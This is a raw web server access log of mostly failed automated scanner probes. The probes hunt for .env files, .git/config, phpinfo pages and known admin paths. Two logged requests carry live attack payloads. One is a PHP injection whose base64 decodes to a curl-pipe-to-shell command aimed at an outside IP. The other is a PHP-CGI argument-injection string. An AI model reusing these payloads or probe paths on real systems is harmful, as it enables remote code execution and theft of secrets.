{"level":"info","message":"GET /favicon.ico 404 9 - 0.238 ms"}
{"level":"info","message":"GET / 404 9 - 0.224 ms"}
{"level":"info","message":"GET /geoserver/web/ 404 9 - 0.404 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.229 ms"}
{"level":"info","message":"GET /my/en-us 404 9 - 0.602 ms"}
{"level":"info","message":"GET / 404 9 - 0.235 ms"}
{"level":"info","message":"GET /actuator/gateway/routes 404 9 - 0.877 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.462 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.214 ms"}
{"level":"info","message":"GET / 404 9 - 0.634 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.254 ms"}
{"level":"info","message":"GET /wiki 404 9 - 0.250 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.298 ms"}
{"level":"info","message":"GET /ReportServer 404 9 - 0.431 ms"}
{"level":"info","message":"GET / 404 9 - 0.556 ms"}
{"level":"info","message":"GET /download/powershell/ 404 9 - 0.293 ms"}
{"level":"info","message":"GET /ab2g 404 9 - 0.261 ms"}
{"level":"info","message":"GET /ab2h 404 9 - 0.294 ms"}
{"level":"info","message":"GET / 404 9 - 0.826 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.407 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.236 ms"}
{"level":"info","message":"GET /owa/auth/x.js 404 9 - 1.495 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.568 ms"}
{"level":"info","message":"GET / 404 9 - 0.254 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.284 ms"}
{"level":"info","message":"GET /sitemap.xml 404 9 - 0.236 ms"}
{"level":"info","message":"GET /.well-known/security.txt 404 9 - 0.236 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.239 ms"}
{"level":"info","message":"GET / 404 9 - 0.254 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.251 ms"}
{"level":"info","message":"GET / 404 9 - 0.281 ms"}
{"level":"info","message":"GET /download/powershell/ 404 9 - 0.282 ms"}
{"level":"info","message":"GET /ab2g 404 9 - 0.370 ms"}
{"level":"info","message":"GET /ab2h 404 9 - 0.268 ms"}
{"level":"info","message":"GET /index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode(\"Y3VybCAxNzYuNjUuMTQ5LjE5MyB8IHNo\"));die()?> 404 9 - 0.751 ms"}
{"level":"info","message":"GET /autodiscover/autodiscover.json?@zdi/Powershell 404 9 - 0.300 ms"}
{"level":"info","message":"GET / 404 9 - 0.256 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.254 ms"}
{"level":"info","message":"GET /_profiler/phpinfo 404 9 - 0.264 ms"}
{"level":"info","message":"GET / 404 9 - 0.288 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.808 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.319 ms"}
{"level":"info","message":"GET /api/.env 404 9 - 0.292 ms"}
{"level":"info","message":"GET /backend/.env 404 9 - 0.264 ms"}
{"level":"info","message":"GET /admin/.env 404 9 - 0.282 ms"}
{"level":"info","message":"GET /.env.example 404 9 - 0.257 ms"}
{"level":"info","message":"GET /app_dev.php/_profiler/phpinfo 404 9 - 0.317 ms"}
{"level":"info","message":"GET /?phpinfo=-1 404 9 - 0.231 ms"}
{"level":"info","message":"GET /?url=.env 404 9 - 0.228 ms"}
{"level":"info","message":"GET /staging/.env 404 9 - 0.273 ms"}
{"level":"info","message":"GET /app_dev.php/_profiler/open?file=app/config/parameters.yml 404 9 - 0.248 ms"}
{"level":"info","message":"GET /phpinfo.php 404 9 - 0.268 ms"}
{"level":"info","message":"GET /info/ 404 9 - 0.232 ms"}
{"level":"info","message":"GET /app/.env 404 9 - 0.274 ms"}
{"level":"info","message":"GET /phpinfo/ 404 9 - 0.222 ms"}
{"level":"info","message":"GET /dev/.env 404 9 - 0.273 ms"}
{"level":"info","message":"GET /.env.production 404 9 - 0.253 ms"}
{"level":"info","message":"GET /.env.save 404 9 - 0.405 ms"}
{"level":"info","message":"GET /demo/.env 404 9 - 0.277 ms"}
{"level":"info","message":"GET /img/.env 404 9 - 0.252 ms"}
{"level":"info","message":"GET /vendor/.env 404 9 - 0.240 ms"}
{"level":"info","message":"GET /php-info.php 404 9 - 0.235 ms"}
{"level":"info","message":"GET /inf/ 404 9 - 0.236 ms"}
{"level":"info","message":"GET /upload/.env 404 9 - 0.271 ms"}
{"level":"info","message":"GET /includes/.env 404 9 - 0.248 ms"}
{"level":"info","message":"GET /APPS/.env 404 9 - 0.243 ms"}
{"level":"info","message":"GET /application/.env 404 9 - 0.288 ms"}
{"level":"info","message":"GET /.config 404 9 - 0.252 ms"}
{"level":"info","message":"GET /doc/.env 404 9 - 0.228 ms"}
{"level":"info","message":"GET / 404 9 - 2.573 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/0/0/0.pbf 304 - - 28.665 ms"}
{"level":"info","message":"GET / 404 9 - 0.425 ms"}
{"level":"info","message":"GET /version 404 9 - 0.867 ms"}
{"level":"info","message":"GET / 404 9 - 0.274 ms"}
{"level":"info","message":"GET / 404 9 - 0.533 ms"}
{"level":"info","message":"GET /fapi/v1/ticker/bookTicker?symbol=BTCUSDT 404 9 - 0.522 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.346 ms"}
{"level":"info","message":"GET / 404 9 - 0.569 ms"}
{"level":"info","message":"GET / 404 9 - 0.406 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.321 ms"}
{"level":"info","message":"GET /security.txt 404 9 - 0.285 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.302 ms"}
{"level":"info","message":"GET /.env.save 404 9 - 0.286 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.804 ms"}
{"level":"info","message":"POST / 404 9 - 14.470 ms"}
{"level":"info","message":"GET / 404 9 - 0.278 ms"}
{"level":"info","message":"GET / 404 9 - 0.740 ms"}
{"level":"info","message":"GET / 404 9 - 0.653 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.682 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.251 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.683 ms"}
{"level":"info","message":"GET /shop/.env 404 9 - 0.314 ms"}
{"level":"info","message":"GET / 404 9 - 0.544 ms"}
{"level":"info","message":"POST /dns-query 404 9 - 0.774 ms"}
{"level":"info","message":"GET / 404 9 - 0.385 ms"}
{"level":"info","message":"GET / 404 9 - 0.869 ms"}
{"level":"info","message":"GET / 404 9 - 0.493 ms"}
{"level":"info","message":"GET /webui/ 404 9 - 0.407 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.272 ms"}
{"level":"info","message":"GET / 404 9 - 0.383 ms"}
{"level":"info","message":"GET /geoserver/web/ 404 9 - 0.330 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.240 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.992 ms"}
{"level":"info","message":"GET / 404 9 - 0.423 ms"}
{"level":"info","message":"GET / 404 9 - 0.323 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 1.070 ms"}
{"level":"info","message":"GET / 404 9 - 0.289 ms"}
{"level":"info","message":"GET / 404 9 - 0.349 ms"}
{"level":"info","message":"GET / 404 9 - 0.373 ms"}
{"level":"info","message":"GET / 404 9 - 0.602 ms"}
{"level":"info","message":"GET / 404 9 - 0.505 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.439 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.323 ms"}
{"level":"info","message":"GET / 404 9 - 0.343 ms"}
{"level":"info","message":"GET / 404 9 - 0.259 ms"}
{"level":"info","message":"GET /th-th/home 404 9 - 0.472 ms"}
{"level":"info","message":"GET /_static/.env 404 9 - 0.785 ms"}
{"level":"info","message":"GET / 404 9 - 0.468 ms"}
{"level":"info","message":"GET / 404 9 - 1.041 ms"}
{"level":"info","message":"GET / 404 9 - 0.285 ms"}
{"level":"info","message":"POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input 404 9 - 0.552 ms"}
{"level":"info","message":"GET / 404 9 - 0.789 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.307 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.230 ms"}
{"level":"info","message":"GET /sitemap.xml 404 9 - 0.198 ms"}
{"level":"info","message":"GET /login 404 9 - 0.945 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.522 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.260 ms"}
{"level":"info","message":"GET /store/public/assets/auth/img/logo.png 404 9 - 0.364 ms"}
{"level":"info","message":"GET /?XDEBUG_SESSION_START=phpstorm 404 9 - 0.764 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/0/0/0.pbf 304 - - 3.405 ms"}
{"level":"info","message":"GET / 404 9 - 0.635 ms"}
{"level":"info","message":"GET /ab2g 404 9 - 0.908 ms"}
{"level":"info","message":"GET /ab2h 404 9 - 0.311 ms"}
{"level":"info","message":"GET / 404 9 - 0.335 ms"}
{"level":"info","message":"GET /download/powershell/ 404 9 - 0.267 ms"}
{"level":"info","message":"GET / 404 9 - 0.895 ms"}
{"level":"info","message":"GET / 404 9 - 0.447 ms"}
{"level":"info","message":"GET /core/.env 404 9 - 0.738 ms"}
{"level":"info","message":"GET /fapi/v1/ticker/bookTicker?symbol=BTCUSDT 404 9 - 0.226 ms"}
{"level":"info","message":"GET /core/.env 404 9 - 0.360 ms"}
{"level":"info","message":"GET / 404 9 - 0.334 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.234 ms"}
{"level":"info","message":"GET /sitemap.xml 404 9 - 0.322 ms"}
{"level":"info","message":"GET /.well-known/security.txt 404 9 - 0.255 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.230 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.271 ms"}
{"level":"info","message":"POST / 404 9 - 1.523 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.821 ms"}
{"level":"info","message":"GET / 404 9 - 1.072 ms"}
{"level":"info","message":"GET / 404 9 - 0.308 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.342 ms"}
{"level":"info","message":"GET /api/v2/static/not.found 404 9 - 0.291 ms"}
{"level":"info","message":"GET /api/v2/static/not.found 404 9 - 0.248 ms"}
{"level":"info","message":"GET /remote/logincheck 404 9 - 0.331 ms"}
{"level":"info","message":"GET /remote/logincheck 404 9 - 0.312 ms"}
{"level":"info","message":"GET /fonts/ftnt-icons.woff 404 9 - 0.311 ms"}
{"level":"info","message":"GET /fonts/ftnt-icons.woff 404 9 - 0.264 ms"}
{"level":"info","message":"GET /login?redir=/ng 404 9 - 0.281 ms"}
{"level":"info","message":"GET /login?redir=/ng 404 9 - 0.283 ms"}
{"level":"info","message":"GET /lang/custom/sbin/init 404 9 - 0.321 ms"}
{"level":"info","message":"GET /lang/custom/sbin/init 404 9 - 0.164 ms"}
{"level":"info","message":"GET /.env_1 404 9 - 0.227 ms"}
{"level":"info","message":"GET /static/lang/custom/sbin/init 404 9 - 0.400 ms"}
{"level":"info","message":"GET /static/lang/custom/sbin/init 404 9 - 0.289 ms"}
{"level":"info","message":"GET /lang/legacy/filechecksum 404 9 - 0.297 ms"}
{"level":"info","message":"GET /lang/legacy/filechecksum 404 9 - 0.277 ms"}
{"level":"info","message":"GET /migadmin/lang/legacy/legacy/filechecksum 404 9 - 0.276 ms"}
{"level":"info","message":"GET /migadmin/lang/legacy/legacy/filechecksum 404 9 - 0.250 ms"}
{"level":"info","message":"GET / 404 9 - 0.711 ms"}
{"level":"info","message":"GET /actuator/gateway/routes 404 9 - 0.354 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.516 ms"}
{"level":"info","message":"GET / 404 9 - 0.712 ms"}
{"level":"info","message":"GET / 404 9 - 0.914 ms"}
{"level":"info","message":"GET / 404 9 - 0.306 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.328 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.276 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.298 ms"}
{"level":"info","message":"GET /.git/index 404 9 - 0.958 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.331 ms"}
{"level":"info","message":"GET /test 404 9 - 0.267 ms"}
{"level":"info","message":"GET / 404 9 - 0.318 ms"}
{"level":"info","message":"GET /api/.env 404 9 - 0.265 ms"}
{"level":"info","message":"GET /api/.env 404 9 - 0.371 ms"}
{"level":"info","message":"GET /pdown 404 9 - 0.385 ms"}
{"level":"info","message":"GET /pdown 404 9 - 0.308 ms"}
{"level":"info","message":"GET /developmentserver/metadatauploader 404 9 - 0.476 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.844 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.269 ms"}
{"level":"info","message":"GET / 404 9 - 1.096 ms"}
{"level":"info","message":"GET / 404 9 - 0.323 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.266 ms"}
{"level":"info","message":"GET /security.txt 404 9 - 0.256 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.302 ms"}
